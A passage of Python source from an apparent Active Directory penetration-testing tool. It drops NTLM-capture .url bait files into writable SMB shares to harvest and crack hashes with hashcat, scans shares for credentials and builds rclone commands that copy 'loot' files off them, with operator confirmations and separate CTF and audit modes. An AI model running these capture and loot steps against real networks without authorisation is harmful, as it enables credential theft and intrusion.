    every writable folder is shown explicitly with its write-confirmed marker, so
    the operator sees WHY a sub-folder is a better drop site than the root.
    """
    lines = [
        "[bold]Writable drop candidates[/bold] (SMB2 MxAc effective WRITE confirmed)",
        f"[dim]Host[/dim] {mark_sensitive(target_host, 'hostname')}",
        "",
    ]
    for tgt in targets:
        label = _ntlm_bait_target_label(tgt.share, tgt.directory_path)
        hint = (
            "  [cyan](browse-likely)[/cyan]"
            if _ntlm_bait_is_browse_likely(tgt.directory_path)
            else ""
        )
        lines.append(f"  [green]>[/green] {mark_sensitive(label, 'path')}{hint}")
    print_panel(
        "\n".join(lines),
        title="[bold]NTLM Share-Drop Capture[/bold] [cyan]writable folders[/cyan]",
        title_align="left",
        border_style="cyan",
    )


def run_ntlmv2_capture_for_writable_shares(
    shell: Any,
    *,
    domain: str,
    host: str,
    writable_share_names: Any,
    username: str,
    credential: str,
) -> None:
    """Single-source NTLMv2 share-drop capture core — name-driven, no ShareViews.

    This is the canonical capture implementation reused by both the live
    interactive flow (called via :func:`_offer_ntlmv2_share_drop_capture` after
    reducing ``ShareView`` objects to names) and the SMB Share Exposure scan
    phase (which already has writable share names from the collector, without
    needing ``ShareView`` objects).

    Gating:
    * **listener IP** (``shell.myip``) must be set — no listener, no capture.
    * **target host** must be a non-empty string.
    * **CTF** (``shell.type == "ctf"``): drop in ALL writable folders.
      Interactive presents them with ALL pre-selected (operator can trim);
      non-interactive (CI) auto-selects ALL with no prompt — this is what makes
      the htb-regression CI solve Breach autonomously.
    * **Audit** (``shell.type != "ctf"``): interactive presents the writable
      folders with the browse-likely ones (``transfer``, ``upload``, ...)
      pre-selected and root + others left unselected; the operator decides.
      Non-interactive (audit CI): SKIP entirely — never drop unattended on a
      real client.

    Args:
        shell: The active ``PentestShell`` (or equivalent namespace); must have
            ``myip``, ``type``, and ``auto`` attributes.
        domain: Target AD domain (used for Kerberos realm + credential dict).
        host: Target host name or IP (SMB connection + bait destination).
        writable_share_names: Iterable of share names confirmed writable. Empty
            or blank names are silently skipped; an empty result returns early.
        username: Authenticating username.
        credential: Password or NT hash for the authenticating principal.
    """
    writable_share_names = [str(n).strip() for n in (writable_share_names or []) if str(n).strip()]
    if not writable_share_names:
        return

    listener_ip = str(getattr(shell, "myip", "") or "").strip()
    if not listener_ip:
        print_info_debug(
            "ntlmv2-share-capture: writable share(s) found but no listener IP "
            "(shell.myip unset); skipping the bait offer."
        )
        return

    target_host = str(host or "").strip()
    if not target_host:
        print_info_debug(
            "ntlmv2-share-capture: writable share(s) found but no target host; "
            "skipping the bait offer."
        )
        return

    workspace_type = str(getattr(shell, "type", "") or "").strip().lower()
    is_ctf = workspace_type == "ctf"
    non_interactive = is_non_interactive(shell)

    # Audit + non-interactive: never drop bait unattended on a real client.
    if not is_ctf and non_interactive:
        print_info_debug(
            "ntlmv2-share-capture: audit + non-interactive session; skipping the "
            "bait offer (never drop unattended on a real client)."
        )
        return

    creds = {
        "username": str(username or "").strip(),
        "password": str(credential or "").strip(),
        "auth_domain": domain,
    }

    from adscan_internal.rich_output import confirm_ask  # noqa: PLC0415

    # Confirm INTENT before any folder enumeration. A decline does ZERO
    # enumeration — the writable-folder MxAc walk (the only live work this step
    # does; the writable SHARES already come from the Phase 2 collector) runs
    # only once the operator commits to dropping bait. Type-aware default: CTF
    # defaults to YES (autonomy — htb-regression auto-proceeds and the
    # non-interactive confirm resolves to this default → auto-all), audit
    # defaults to NO (explicit opt-in on a real client). Audit + non-interactive
    # already returned above, so this confirm is interactive-audit or any CTF.
    if not confirm_ask(
        "Drop an NTLM-capture bait on the writable share(s) to harvest hashes "
        "when a privileged user browses them? Writable folders will then be "
        "enumerated (SMB2 MxAc) to choose drop targets.",
        default=is_ctf,
    ):
        return

    # ── Part 1: enumerate writable folders (root + sub-folders) per share ────
    print_info(
        "[*] Enumerating writable folders (SMB2 MxAc, read-only) in "
        f"{len(writable_share_names)} writable share(s) on "
        f"{mark_sensitive(target_host, 'hostname')}."
    )
    targets = _enumerate_ntlm_bait_targets(
        writable_share_names=writable_share_names,
        target_host=target_host,
        creds=creds,
        domain=domain,
    )
    if not targets:
        print_info(
            "[~] No writable folders confirmed for the current credentials — "
            "NTLM share-drop capture skipped."
        )
        return

    from adscan_internal.rich_output import (  # noqa: PLC0415
        questionary_checkbox_values,
    )
    from adscan_internal.services.post_exploitation.ntlmv2_share_capture_service import (  # noqa: PLC0415
        URL_BAIT,
        run_multi_share_capture,
    )

    # ── Part 3: target selection UX, gated by workspace type ─────────────────
    selected_targets: list[Any]
    if is_ctf:
        if non_interactive:
            # CTF CI: auto-select ALL writable folders, no prompt. This makes
            # the htb-regression run capture autonomously on Breach.
            selected_targets = list(targets)
            print_info(
                f"[*] CTF non-interactive: baiting ALL {len(selected_targets)} "
                "writable folder(s) autonomously."
            )
        else:
            # CTF interactive: show the folders, default-select ALL (trimmable).
            _render_ntlm_bait_targets_panel(targets, target_host)
            options = [_ntlm_bait_target_label(t.share, t.directory_path) for t in targets]
            chosen_labels = questionary_checkbox_values(
                title="CTF: select writable folders to bait (all pre-selected)",
                options=options,
                default_values=options,
                shell=shell,
            )
            chosen = set(chosen_labels or [])
            selected_targets = [
                t
                for t in targets
                if _ntlm_bait_target_label(t.share, t.directory_path) in chosen
            ]
    else:
        # Audit interactive: intent already confirmed before enumeration (above);
        # here the operator just picks WHICH writable folders to bait. Heuristic
        # pre-select browse-likely folders; root + others left unselected.
        _render_ntlm_bait_targets_panel(targets, target_host)
        options = [_ntlm_bait_target_label(t.share, t.directory_path) for t in targets]
        preselect = [
            _ntlm_bait_target_label(t.share, t.directory_path)
            for t in targets
            if _ntlm_bait_is_browse_likely(t.directory_path)
        ]
        chosen_labels = questionary_checkbox_values(
            title="Audit: select writable folders to bait (browse-likely pre-selected)",
            options=options,
            default_values=preselect,
            shell=shell,
        )
        chosen = set(chosen_labels or [])
        selected_targets = [
            t
            for t in targets
            if _ntlm_bait_target_label(t.share, t.directory_path) in chosen
        ]

    if not selected_targets:
        print_info("[~] No folders selected — NTLM share-drop capture skipped.")
        return

    # ── Part 5: audit-interactive no-capture iteration provider ──────────────
    # On a no-capture round, offer to widen to the remaining writable folders.
    # CTF already drops all up front, so it gets no provider. Audit interactive
    # only; never runs in CI.
    additional_provider = None
    if not is_ctf and not non_interactive:

        def _additional_targets_provider(already_dropped: list[Any]) -> list[Any]:
            dropped_keys = {t.key for t in already_dropped}
            remaining = [t for t in targets if t.key not in dropped_keys]
            if not remaining:
                return []
            if not confirm_ask(
                f"No capture yet. Drop in {len(remaining)} additional writable "
                "folder(s)?",
                default=False,
            ):
                return []
            options = [
                _ntlm_bait_target_label(t.share, t.directory_path) for t in remaining
            ]
            chosen_labels = questionary_checkbox_values(
                title="Select additional writable folders to bait",
                options=options,
                default_values=options,
                shell=shell,
            )
            chosen_set = set(chosen_labels or [])
            return [
                t
                for t in remaining
                if _ntlm_bait_target_label(t.share, t.directory_path) in chosen_set
            ]

        additional_provider = _additional_targets_provider

    print_info(
        "[*] Dropping NTLM-capture bait (.url) into "
        f"{len(selected_targets)} writable folder(s) on "
        f"{mark_sensitive(target_host, 'hostname')}."
    )

    try:
        capture_result = run_multi_share_capture(
            shell=shell,
            domain=domain,
            creds=creds,
            targets=selected_targets,
            target_host=target_host,
            listener_ip=listener_ip,
            file_type=URL_BAIT,
            additional_targets_provider=additional_provider,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_error("Error running NTLM share-drop capture.")
        print_exception(show_locals=False, exception=exc)
        return

    # ── Part 6: offer to crack the captured hash(es) with the existing path ──
    # Reuses the standard hashcat cracking entry point (run_cracking via
    # crack_captured_netntlm) — never a bespoke cracker. Cracking is offline /
    # local (no target impact), so the default is "yes"; in non-interactive
    # runs confirm_ask auto-resolves to the default and run_cracking is itself
    # CI-safe (default wordlist + bounded hashcat timeout), so CI never hangs.
    _offer_crack_for_captured_netntlm(shell, domain=domain, result=capture_result)


def _offer_ntlmv2_share_drop_capture(
    shell: Any,
    *,
    domain: str,
    username: str,
    credential: str,
    host: str,
    views: Any,
) -> None:
    """Live-flow wrapper: reduce ShareViews → writable names, then delegate.

    Gated strictly on the live, MxAc-verified writable set
    (``ShareView.is_writable_live``); all capture logic + gating lives in
    :func:`run_ntlmv2_capture_for_writable_shares` (single source of truth).
    """
    writable_views = _ntlm_bait_writable_share_views(views)
    writable_share_names = [str(v.name).strip() for v in writable_views]
    if not writable_share_names:
        return
    run_ntlmv2_capture_for_writable_shares(
        shell,
        domain=domain,
        host=host,
        writable_share_names=writable_share_names,
        username=username,
        credential=credential,
    )


def _offer_crack_for_captured_netntlm(
    shell: Any,
    *,
    domain: str,
    result: Any,
) -> None:
    """Offer to crack freshly captured NetNTLM hash(es) with the existing path.

    Surfaced right after a share-drop capture. When the session captured >=1
    NTLM response we prompt the operator and, on yes, hand the hash(es) to the
    standard hashcat cracking entry point (``crack_captured_netntlm`` →
    ``run_cracking``) — the SAME logic the kerberoast / AS-REP phases use, so
    wordlist resolution, backend selection, the potfile ``--show`` extraction
    and the cracked-credential feed-back (``shell.add_credential``) are all
    reused, not duplicated. Each captured response is cracked under the correct
    mode for its real wire version: NTLMv2 → ``-m 5600``, NTLMv1 → ``-m 5500``.

    Cracking is offline / local (no target impact), so the confirm default is
    "yes". In non-interactive runs ``confirm_ask`` auto-resolves to that default
    and ``run_cracking`` is itself CI-safe (default wordlist + bounded hashcat
    timeout), so ``adscan ci`` cannot hang here.
    """
    captured = getattr(result, "captured", None) if result is not None else None
    status = str(getattr(result, "status", "") or "") if result is not None else ""
    if status != "captured" or captured is None:
        return

    # The orchestrator surfaces one credential per session; build the batch as a
    # list so multi-capture sessions (future) crack ALL of them, each under its
    # own per-version mode.
    captures = [
        {
            "user": getattr(captured, "clean_user", ""),
            "domain": getattr(captured, "domain", ""),
            "ntlm_version": getattr(captured, "ntlm_version", ""),
            "fullhash": getattr(captured, "fullhash", ""),
        }
    ]
    captures = [c for c in captures if str(c.get("fullhash") or "").strip()]
    if not captures:
        return

    from adscan_internal.rich_output import confirm_ask  # noqa: PLC0415
    from adscan_internal.cli.cracking import crack_captured_netntlm  # noqa: PLC0415

    count = len(captures)
    if not confirm_ask(
        f"Crack the captured NTLM hash{'es' if count != 1 else ''} now with hashcat?",
        default=True,
    ):
        print_info("[~] Captured NTLM hash(es) not cracked — left for later.")
        return

    try:
        crack_captured_netntlm(shell, domain=domain, captures=captures)
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_error("Error cracking the captured NTLM hash(es).")
        print_exception(show_locals=False, exception=exc)


def ask_for_smb_shares_read(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    username: str,
    password: str,
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
) -> None:
    """Prompt user to analyze readable SMB shares with deterministic or AI flows.

    Args:
        shell: Shell instance with domain data and helper methods.
        domain: Domain name.
        shares: List of share names discovered as readable.
        username: Username for authentication.
        password: Password for authentication.
        hosts: List of hostnames/IPs to map/analyze.
        share_map: Optional host->share->permission mapping from share enum.
    """
    from adscan_internal.services.ai_backend_availability_service import (
        AIBackendAvailabilityService,
    )
    from adscan_internal.rich_output import confirm_operation

    if shell.domains_data[domain]["auth"] == "pwned" and shell.type == "ctf":
        return

    original_shares_count = len(shares)
    shares = _filter_shares_by_global_mapping_exclusions(shares)
    share_map = _filter_share_map_by_global_mapping_exclusions(share_map)
    if original_shares_count != len(shares):
        print_info_debug(
            "SMB share list filtered by global mapping exclusions: "
            f"before={original_shares_count} after={len(shares)} "
            "excluded=print$,ipc$,admin$,[A-Z]$"
        )
    if not shares:
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            "No readable SMB shares remain after applying global exclusions for "
            f"{marked_domain}."
        )
        return

    pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")
    num_shares = len(shares) if isinstance(shares, list) else "Multiple"
    num_hosts = len(hosts) if isinstance(hosts, list) else "Multiple"
    output_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "spider_plus",
        "share_tree_map.json",
    )
    marked_output_rel = mark_sensitive(output_rel, "path")
    cifs_output_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "cifs",
        "share_tree_map.json",
    )
    marked_cifs_output_rel = mark_sensitive(cifs_output_rel, "path")
    rclone_output_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "rclone",
        "share_tree_map.json",
    )
    marked_rclone_output_rel = mark_sensitive(rclone_output_rel, "path")

    availability = AIBackendAvailabilityService().get_availability()
    selected_method = _select_post_mapping_sensitive_data_method(
        shell=shell,
        ai_configured=availability.configured,
        domain=domain,
        username=username,
        password=password,
    )
    if selected_method is None:
        print_info("SMB sensitive-data analysis skipped by user.")
        return

    if shell.auto:
        selected_method = _resolve_default_deterministic_share_analysis_method(
            shell,
            domain=domain,
            username=username,
            password=password,
        )

    if selected_method in {
        "deterministic_rclone_direct",
        "deterministic_rclone_mapped",
        "deterministic_cifs",
        "deterministic_manspider",
    }:
        workspace_cwd = shell._get_workspace_cwd()
        _run_post_mapping_sensitive_data_workflow(
            shell,
            domain=domain,
            aggregate_map_abs=domain_path(
                workspace_cwd,
                shell.domains_dir,
                domain,
                shell.smb_dir,
                "spider_plus",
                "share_tree_map.json",
            ),
            aggregate_map_rel=output_rel,
            shares=shares,
            hosts=hosts,
            share_map=share_map,
            triage_username=username,
            triage_password=password,
            selected_method=selected_method,
            cifs_mount_root=_resolve_cifs_mount_root(shell=shell, domain=domain),
        )
        return

    if selected_method == "ai":
        if not confirm_operation(
            operation_name="SMB Share Tree Mapping (native walk + AI)",
            description=(
                "Builds a reusable SMB share tree map with a native recursive SMB "
                "walk (metadata only, no file download), then runs AI triage."
            ),
            context={
                "Domain": domain,
                "PDC": pdc,
                "Username": username,
                "Readable Shares": str(num_shares),
                "Hosts": str(num_hosts),
                "Output": marked_output_rel,
                "Download Files": "No (metadata only)",
            },
            default=True,
            icon="🗺️",
            show_panel=True,
        ):
            return
        run_smb_share_tree_mapping_with_spider_plus(
            shell,
            domain=domain,
            shares=shares,
            username=username,
            password=password,
            hosts=hosts,
            share_map=share_map,
            selected_method="ai",
        )
        return

    if selected_method == "ai_cifs":
        mount_root = _resolve_cifs_mount_root(shell=shell, domain=domain)
        marked_mount_root = mark_sensitive(mount_root, "path")
        if not confirm_operation(
            operation_name="SMB Share Tree Mapping (CIFS + AI)",
            description=(
                "Builds SMB share tree metadata from local CIFS mounts, then runs "
                "AI triage over the consolidated mapping."
            ),
            context={
                "Domain": domain,
                "PDC": pdc,
                "Username": username,
                "Readable Shares": str(num_shares),
                "Hosts": str(num_hosts),
                "CIFS Mount Root": marked_mount_root,
                "Output": marked_cifs_output_rel,
            },
            default=True,
            icon="🗺️",
            show_panel=True,
        ):
            return
        run_smb_share_tree_mapping_with_cifs(
            shell,
            domain=domain,
            shares=shares,
            username=username,
            password=password,
            hosts=hosts,
            share_map=share_map,
            cifs_mount_root=mount_root,
            selected_method="ai_cifs",
        )
        return

    if selected_method == "ai_rclone":
        if not confirm_operation(
            operation_name="SMB Share Tree Mapping (rclone + AI)",
            description=(
                "Builds SMB share tree metadata with rclone lsjson over SMB, then "
                "runs AI triage over the consolidated mapping."
            ),
            context={
                "Domain": domain,
                "PDC": pdc,
                "Username": username,
                "Readable Shares": str(num_shares),
                "Hosts": str(num_hosts),
                "Output": marked_rclone_output_rel,
            },
            default=True,
            icon="🗺️",
            show_panel=True,
        ):
            return
        run_smb_share_tree_mapping_with_rclone(
            shell,
            domain=domain,
            shares=shares,
            username=username,
            password=password,
            hosts=hosts,
            share_map=share_map,
            selected_method="ai_rclone",
        )
        return


def _count_grouped_credential_findings(
    findings: dict[str, list[tuple[str, float | None, str, int, str]]],
) -> tuple[int, int]:
    """Return total findings and distinct source files for grouped findings."""
    total_findings = 0
    file_paths: set[str] = set()
    for entries in findings.values():
        if not isinstance(entries, list):
            continue
        total_findings += len(entries)
        for entry in entries:
            if isinstance(entry, tuple) and len(entry) >= 5:
                file_paths.add(str(entry[4] or "").strip())
    return total_findings, len({path for path in file_paths if path})


def _resolve_credsweeper_artifacts_dir(
    *,
    shell: Any,
    domain: str,
    purpose: str,
) -> str:
    """Return writable workspace directory for CredSweeper JSON artifacts."""
    workspace_cwd = shell._get_workspace_cwd()
    return domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "credsweeper",
        "artifacts",
        purpose,
    )


def _run_credsweeper_path_scan_with_scope(
    *,
    credsweeper_service: Any,
    credsweeper_path: str,
    path_to_scan: str,
    json_output_dir: str,
    benchmark_scope: str,
    candidate_files: int | None = None,
    jobs: int | None = None,
    find_by_ext: bool = False,
) -> dict[str, list[tuple[str, float | None, str, int, str]]]:
    """Run one CredSweeper path scan with scope-aware document semantics."""
    common_kwargs = {
        "credsweeper_path": credsweeper_path,
        "json_output_dir": json_output_dir,
        "include_custom_rules": True,
        "rules_profile": CREDSWEEPER_RULES_PROFILE_FILESYSTEM_TEXT,
        "custom_ml_threshold": "0.0",
        "jobs": jobs,
        "find_by_ext": find_by_ext,
        "timeout": get_default_credsweeper_timeout(candidate_files=candidate_files),
    }
    if benchmark_scope == SMB_SENSITIVE_BENCHMARK_SCOPE_BINARY_ONLY:
        common_kwargs["rules_profile"] = CREDSWEEPER_RULES_PROFILE_FILESYSTEM_DOC
        common_kwargs["timeout"] = get_default_credsweeper_timeout(
            doc=True,
            candidate_files=candidate_files,
        )
        return credsweeper_service.analyze_path_with_options(
            path_to_scan,
            doc=True,
            **common_kwargs,
        )
    if benchmark_scope == SMB_SENSITIVE_BENCHMARK_SCOPE_DOCUMENTS_DEPTH_EXPERIMENTAL:
        common_kwargs["rules_profile"] = CREDSWEEPER_RULES_PROFILE_FILESYSTEM_DOC
        common_kwargs["timeout"] = get_default_credsweeper_timeout(
            doc=True,
            depth=True,
            candidate_files=candidate_files,
        )
        return credsweeper_service.analyze_path_with_options(
            path_to_scan,
            doc=True,
            depth=True,
            **common_kwargs,
        )
    if benchmark_scope == SMB_SENSITIVE_BENCHMARK_SCOPE_ALL_SUPPORTED:
        text_findings = credsweeper_service.analyze_path_with_options(
            path_to_scan,
            doc=False,
            **common_kwargs,
        )
        common_kwargs["rules_profile"] = CREDSWEEPER_RULES_PROFILE_FILESYSTEM_DOC
        common_kwargs["timeout"] = get_default_credsweeper_timeout(
            doc=True,
            candidate_files=candidate_files,
        )
        doc_findings = credsweeper_service.analyze_path_with_options(
            path_to_scan,
            doc=True,
            **common_kwargs,
        )
        return _merge_grouped_credential_findings(text_findings, doc_findings)
    return credsweeper_service.analyze_path_with_options(
        path_to_scan,
        doc=False,
        **common_kwargs,
    )


def _ensure_rclone_available(shell: Any) -> str | None:
    """Validate rclone availability and return its resolved executable path."""
    rclone_path = _resolve_rclone_path(shell)
    version_result = shell.run_command(
        f"{shlex.quote(rclone_path)} version",
        timeout=30,
        ignore_errors=True,
    )
    if version_result is None or int(getattr(version_result, "returncode", 1)) != 0:
        print_warning(
            "rclone is not configured or not available. Skipping rclone benchmark."
        )
        return None
    return rclone_path


def _build_rclone_include_args(
    *,
    extensions: tuple[str, ...],
) -> str:
    """Build repeated rclone include filters for one shared extension whitelist."""
    patterns: list[str] = []
    seen: set[str] = set()
    for extension in extensions:
        normalized = str(extension or "").strip().casefold()
        if not normalized.startswith("."):
            continue
        pattern = f"*{normalized}"
        if pattern in seen:
            continue
        seen.add(pattern)
        patterns.append(f"--include {shlex.quote(pattern)}")
    return " ".join(patterns)


def _build_rclone_copy_command(
    *,
    rclone_path: str,
    remote: str,
    destination_dir: str,
    extensions: tuple[str, ...],
    tuning: RcloneTuning,
    max_size_bytes: int | None = None,
) -> str:
    """Build one rclone copy command for a filtered SMB share download."""
    include_args = _build_rclone_include_args(extensions=extensions)
    destination_arg = shlex.quote(str(destination_dir))
    command_parts = [
        shlex.quote(rclone_path),
        "copy",
        shlex.quote(remote),
        destination_arg,
        "--checkers",
        str(max(1, int(tuning.checkers))),
        "--transfers",
        str(max(1, int(tuning.transfers))),
        "--buffer-size",
        shlex.quote(str(tuning.buffer_size)),
        "--ignore-times",
        # Loot copy is best-effort: cap retries so a deterministic
        # "Network Name Not Found" (share absent / access denied) is not
        # re-attempted 3x with ~20s backoff each. At host scale that default
        # 3x high-level retry dominated multi-hour runs (a paying audit aborted
        # at 2h38m). --low-level-retries 2 keeps a small allowance for a genuine
        # transient file-read blip on a share that does exist.
        "--retries",
        "1",
        "--low-level-retries",
        "2",
    ]
    if include_args:
        command_parts.append(include_args)
    if isinstance(max_size_bytes, int) and max_size_bytes > 0:
        max_size_mb = max(1, int(max_size_bytes // (1024 * 1024)))
        command_parts.extend(["--max-size", f"{max_size_mb}M"])
    return " ".join(command_parts)


def _build_rclone_copy_files_from_command(
    *,
    rclone_path: str,
    remote: str,
    destination_dir: str,
    files_from_path: str,
    tuning: RcloneTuning,
    max_size_bytes: int | None = None,
) -> str:
    """Build one rclone copy command constrained by files-from manifest."""
    destination_arg = shlex.quote(str(destination_dir))
    files_from_arg = shlex.quote(str(files_from_path))
    command_parts = [
        shlex.quote(rclone_path),
        "copy",
        shlex.quote(remote),
        destination_arg,
        "--files-from-raw",
        files_from_arg,
        "--checkers",
        str(max(1, int(tuning.checkers))),
        "--transfers",
        str(max(1, int(tuning.transfers))),
        "--buffer-size",
        shlex.quote(str(tuning.buffer_size)),
        "--ignore-times",
        "--no-traverse",
        # Best-effort loot: cap retries so an absent/denied share is not
        # re-attempted 3x with ~20s backoff each (see _build_rclone_copy_command).
        "--retries",
        "1",
        "--low-level-retries",
        "2",
    ]
    if isinstance(max_size_bytes, int) and max_size_bytes > 0:
        max_size_mb = max(1, int(max_size_bytes // (1024 * 1024)))
        command_parts.extend(["--max-size", f"{max_size_mb}M"])
    return " ".join(command_parts)


def _generate_rclone_mapping(
    *,
    shell: Any,
    domain: str,
    username: str,
    password: str,
    hosts: list[str],
    shares: list[str],
    share_map: dict[str, dict[str, str]] | None,
    run_output_abs: str,
    aggregate_map_abs: str,
) -> dict[str, Any]:
    """Generate one fresh rclone mapping and merge it into an aggregate JSON."""
    from adscan_internal.services.rclone_share_mapping_service import (
        RcloneShareMappingService,
    )
    from adscan_internal.services.share_mapping_service import ShareMappingService

    rclone_path = _ensure_rclone_available(shell)
    if not rclone_path:
        return {"success": False}
    if not _is_rclone_supported_for_smb_auth(
        shell,
        domain=domain,
        username=username,
    ):
        print_warning_debug(
            "Skipping rclone mapping because SMB null-session auth is not supported "
            "by the rclone SMB backend."
        )
        return {"success": False}

    os.makedirs(run_output_abs, exist_ok=True)
    share_map_hosts = 0
    share_map_pairs = 0
    if isinstance(share_map, dict):
        for host_name, host_shares in share_map.items():
            if not str(host_name or "").strip() or not isinstance(host_shares, dict):
                continue
            readable_pairs = 0
            for share_name, perms in host_shares.items():
                normalized_share = str(share_name or "").strip()
                perms_text = str(perms or "").strip().lower()
                if (
                    not normalized_share
                    or _is_globally_excluded_mapping_share(normalized_share)
                    or "read" not in perms_text
                ):
                    continue
                readable_pairs += 1
            if readable_pairs <= 0:
                continue
            share_map_hosts += 1
            share_map_pairs += readable_pairs

    target_pairs = _resolve_cifs_host_share_targets(
        hosts=hosts,
        shares=shares,
        share_map=share_map,
    )
    fallback_used = not (isinstance(share_map, dict) and bool(share_map_pairs))
    print_info_debug(
        "rclone mapping target resolution: "
        f"source={'share_map' if not fallback_used else 'hosts_x_shares_fallback'} "
        f"resolved_targets={len(target_pairs)} share_map_hosts={share_map_hosts} "
        f"share_map_pairs={share_map_pairs} fallback_used={fallback_used} "
        f"hosts={len(hosts)} shares={len(shares)}"
    )
    transport_username, transport_password, transport_domain = (
        _resolve_rclone_transport_auth(
            shell,
            domain=domain,
            username=username,
            password=password,
        )
    )
    rclone_service = RcloneShareMappingService()
    mapping_result = rclone_service.generate_host_metadata_json(
        run_output_dir=run_output_abs,
        host_share_targets=target_pairs,
        username=transport_username,
        password=transport_password,
        domain=transport_domain,
        command_executor=shell.run_command,
        rclone_path=rclone_path,
        timeout_seconds=1200,
    )
    run_id = Path(run_output_abs).name
    share_mapping_service = ShareMappingService()
    share_mapping_service.merge_spider_plus_run(
        domain=domain,
        principal=f"{domain}\\{username}",
        run_id=run_id,
        run_output_dir=run_output_abs,
        aggregate_map_path=aggregate_map_abs,
        requested_hosts=hosts,
        requested_shares=shares,
        host_share_permissions=share_map,
    )
    return {
        "success": bool(int(mapping_result.get("host_json_files", 0) or 0) > 0),
        "mapped_shares": int(mapping_result.get("mapped_shares", 0) or 0),
        "partial_targets": int(mapping_result.get("partial_targets", 0) or 0),
        "failed_targets": int(mapping_result.get("failed_targets", 0) or 0),
        "aggregate_map_path": aggregate_map_abs,
        "run_output_dir": run_output_abs,
    }


def _write_rclone_files_from_manifest(
    *,
    manifest_dir: str,
    host: str,
    share: str,
    remote_paths: list[str],
) -> str:
    """Write one files-from-raw manifest for a host/share exact download."""
    os.makedirs(manifest_dir, exist_ok=True)
    manifest_name = f"{_slugify_token(host)}__{_slugify_token(share)}.txt"
    manifest_path = os.path.join(manifest_dir, manifest_name)
    with open(manifest_path, "w", encoding="utf-8") as handle:
        for remote_path in remote_paths:
            normalized = str(remote_path or "").strip().replace("\\", "/")
            if not normalized:
                continue
            handle.write(normalized + "\n")
    return manifest_path


def _run_rclone_copy_loot_download(
    *,
    shell: Any,
    domain: str,
    username: str,
    password: str,
    target_pairs: list[tuple[str, str]],
    loot_dir: str,
    extensions: tuple[str, ...],
    mostly_small_files: bool = True,
    operation_label: str = "benchmark",
    max_size_bytes: int | None = None,
) -> dict[str, Any]:
    """Download matching SMB share files with rclone into one local loot tree."""
    from adscan_internal.services.rclone_share_mapping_service import (
        RcloneShareMappingService,
    )

    rclone_path = _ensure_rclone_available(shell)
    if not rclone_path:
        return {
            "success": False,
            "copied_targets": 0,
            "failed_targets": len(target_pairs),
        }
    if not _is_rclone_supported_for_smb_auth(
        shell,
        domain=domain,
        username=username,
        password=password,
    ):
        print_warning_debug(
            f"Skipping rclone {operation_label}: "
            f"{_get_rclone_unsupported_smb_auth_reason(shell, domain=domain, username=username, password=password)}"
        )
        return {
            "success": False,
            "copied_targets": 0,
            "failed_targets": len(target_pairs),
        }

    service = RcloneShareMappingService()
    transport_username, transport_password, transport_domain = (
        _resolve_rclone_transport_auth(
            shell,
            domain=domain,
            username=username,
            password=password,
        )
    )
    obscured_password = service.obscure_password(
        command_executor=shell.run_command,
        rclone_path=rclone_path,
        password=transport_password,
    )
    if transport_password and obscured_password == "":
        print_warning(
            f"rclone could not obscure the SMB password. Skipping rclone {operation_label}."
        )
        return {
            "success": False,
            "copied_targets": 0,
            "failed_targets": len(target_pairs),
        }

    tuning = choose_rclone_tuning(
        target_count=len(target_pairs),
        mostly_small_files=mostly_small_files,
    )
    copied_targets = 0
    failed_targets = 0
    partial_targets = 0
    print_info_debug(
        f"rclone {operation_label} tuning: "
        f"targets={len(target_pairs)} workers={tuning.target_workers} "
        f"transfers={tuning.transfers} checkers={tuning.checkers} "
        f"buffer_size={tuning.buffer_size}"
    )

    def _download_one_target(target: tuple[str, str]) -> dict[str, Any]:
        host, share = target
        remote = service.build_smb_remote(
            host=host,
            share=share,
            username=transport_username,
            obscured_password=obscured_password,
            domain=transport_domain,
        )
        target_loot_dir = os.path.join(loot_dir, host, share)
        os.makedirs(target_loot_dir, exist_ok=True)
        command = _build_rclone_copy_command(
            rclone_path=rclone_path,
            remote=remote,
            destination_dir=target_loot_dir,
            extensions=extensions,
            tuning=tuning,
            max_size_bytes=max_size_bytes,
        )
        print_info_debug(
            f"rclone {operation_label} download command: "
            f"host={mark_sensitive(host, 'host')} share={mark_sensitive(share, 'share')} "
            f"command={command}"
        )
        rclone_env = service.build_rclone_env(obscured_password)
        run_kwargs: dict[str, Any] = {"timeout": 1200, "ignore_errors": True}
        if rclone_env is not None:
            run_kwargs["env"] = rclone_env
        result = shell.run_command(command, **run_kwargs)
        copied_file_count = _count_files_under_path(target_loot_dir)
        if result is None:
            return {"status": "failed", "host": host, "share": share, "rc": None}
        return_code = int(getattr(result, "returncode", 1))
        if return_code == 0:
            return {"status": "copied", "host": host, "share": share, "rc": return_code}
        if copied_file_count > 0:
            return {
                "status": "partial",
                "host": host,
                "share": share,
                "rc": return_code,
            }
        return {"status": "failed", "host": host, "share": share, "rc": return_code}

    if target_pairs:
        with ThreadPoolExecutor(max_workers=tuning.target_workers) as executor:
            futures = {
                executor.submit(_download_one_target, target): target
                for target in target_pairs
            }
            for future in as_completed(futures):
                result = future.result()
                status = str(result.get("status", "failed"))
                host = str(result.get("host", ""))
                share = str(result.get("share", ""))
                rc = result.get("rc")
                if status == "copied":
                    copied_targets += 1
                    continue
                if status == "partial":
                    partial_targets += 1
                    copied_targets += 1
                    print_warning_debug(
                        f"rclone {operation_label} target returned non-zero after partial download: "
                        f"host={host} share={share} rc={rc}"
                    )
                    continue
                failed_targets += 1
                print_warning_debug(
                    f"rclone {operation_label} target download failed: "
                    f"host={host} share={share} rc={rc}"
                )

    return {
        "success": copied_targets > 0 or (not target_pairs),
        "copied_targets": copied_targets,
        "partial_targets": partial_targets,
        "failed_targets": failed_targets,
    }


def _run_rclone_copy_mapped_loot_download(
    *,
    shell: Any,
    domain: str,
    username: str,
    password: str,
    grouped_remote_paths: dict[tuple[str, str], list[str]],
    loot_dir: str,
    manifest_dir: str,
    mostly_small_files: bool = True,
    operation_label: str = "mapped benchmark",
    max_size_bytes: int | None = None,
) -> dict[str, Any]:
    """Download exact remote paths with rclone using files-from manifests."""
    from adscan_internal.services.rclone_share_mapping_service import (
        RcloneShareMappingService,
    )

